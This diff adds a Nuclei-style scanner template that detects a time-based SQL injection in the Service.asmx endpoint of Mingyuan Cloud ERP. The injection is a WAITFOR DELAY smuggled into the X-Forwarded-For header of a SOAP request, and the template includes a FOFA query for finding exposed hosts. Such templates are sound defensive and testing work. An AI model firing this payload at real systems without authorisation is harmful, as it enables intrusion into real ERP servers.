@@ -1,0 +1,45 @@
+id: mingyuan-erp-service-sqli
+
+info:
+  name: 明源云 Service.asmx - SQL Injection
+  author: qwtd
+  severity: high
+  description: |-
+    明源云ERP是一款专门为房地产行业设计的企业资源计划（ERP）系统。它旨在帮助房地产公司更有效地管理其业务流程，从项目开发到销售，再到售后服务。该系统集成了财务管理、项目管理、合同管理、采购管理、销售管理等多个模块，提供端到端的解决方案。该系统某接口存在SQL注入漏洞，该漏洞可以直接执行SQL语句并且回显到数据包中。
+    FOFA: body="报表服务已正常运行"
+  reference:
+    - https://mp.weixin.qq.com/s/iUv6iV71vh_6uBLZpyJX0Q
+  tags: 明源云-ERP
+
+http:
+  - raw:
+      - |
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:4'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - 'queryProjectsResult'
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration >= 4'
